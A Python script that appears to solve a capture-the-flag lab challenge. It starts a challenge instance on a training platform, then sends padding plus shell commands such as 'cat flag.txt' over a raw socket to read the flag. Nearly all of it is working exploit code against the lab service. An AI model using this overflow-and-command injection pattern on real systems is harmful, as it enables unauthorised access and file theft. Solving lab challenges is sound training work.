import sys, json, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

cy = CyLab(delay=0.8)
cy.login()
cy.req("PUT", "/api/challenges/525/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/525/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"([A-Za-z0-9][A-Za-z0-9.\-]*\.net)\s+`?(\d{4,5})", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)


def run(cmd):
    s = socket.create_connection((host, port), timeout=20)
    s.settimeout(6)
    time.sleep(0.4)
    try:
        s.recv(8192)
    except Exception:
        pass
    s.sendall(("A" * 10 + cmd + "\n").encode())
    out = b""
    t0 = time.time()
    while time.time() - t0 < 6:
        try:
            c = s.recv(16384)
            if not c:
                break
            out += c
        except socket.timeout:
            break
    s.close()
    return out.decode("utf-8", "replace")


for cmd in ("cat *", "ls", "cat flag.txt"):
    print("=== %r ===" % cmd)
    o = run(cmd)
    print(o[:500])
    f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", o)
    if f:
        print("FLAG:", f.group(0))
        break
    print()
